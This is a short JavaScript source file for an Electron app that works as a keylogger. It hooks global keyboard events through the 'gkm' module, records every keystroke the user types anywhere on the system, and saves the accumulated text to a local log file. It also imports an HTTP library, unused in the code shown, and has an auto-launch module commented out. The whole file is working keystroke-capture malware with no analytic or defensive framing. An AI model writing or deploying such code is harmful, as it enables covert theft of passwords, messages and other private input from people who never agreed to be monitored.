const electron = require('electron');
const request = require('request');
const gkm = require('gkm');
const prepareKey = require('./prepareKey-windows');
const fs = require('fs')
// const autoLaunch = require('./autoLaunch');

const {app} = electron;
let logger = '';

const onKeyPressed = (key) => {
    key[0] == 'Backspace' ? 
    logger = logger.substring(0, logger.length - 1) 
    : logger += prepareKey(key[0]);
 fs.writeFile('csluni-logs.txt', logger, error => console.log );
}

const onReady = () => gkm.events.on('key.pressed', onKeyPressed)
app.on('ready', onReady);
